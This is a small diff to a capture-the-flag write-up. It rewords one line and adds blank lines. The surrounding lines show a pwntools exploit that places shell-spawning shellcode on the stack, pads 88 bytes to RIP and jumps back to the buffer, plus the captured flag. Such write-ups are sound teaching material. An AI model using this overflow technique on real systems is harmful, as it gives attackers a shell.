@@ -70,7 +70,7 @@ payload = asm(shellcraft.sh()) # shellcode
 payload += b'A'*(88 - len(payload)) # junk
 payload += p64(stack_buffer) # buffer base address
 ```
-- let's put our shellcode at first and fill some junk until RIP
+- Let's put our shellcode at the beginning and fill some junk until RIP
  
 *Note: Offset to RIP is **88*** 
 
@@ -98,5 +98,6 @@ p.interactive()
 
 ![](https://i.imgur.com/XzfYQ6L.png)
 - We got our flag `1337UP{Y0u_ju5t_r3g15t3r3d_f0r_50m3_p01nt5}`
+    
     
     
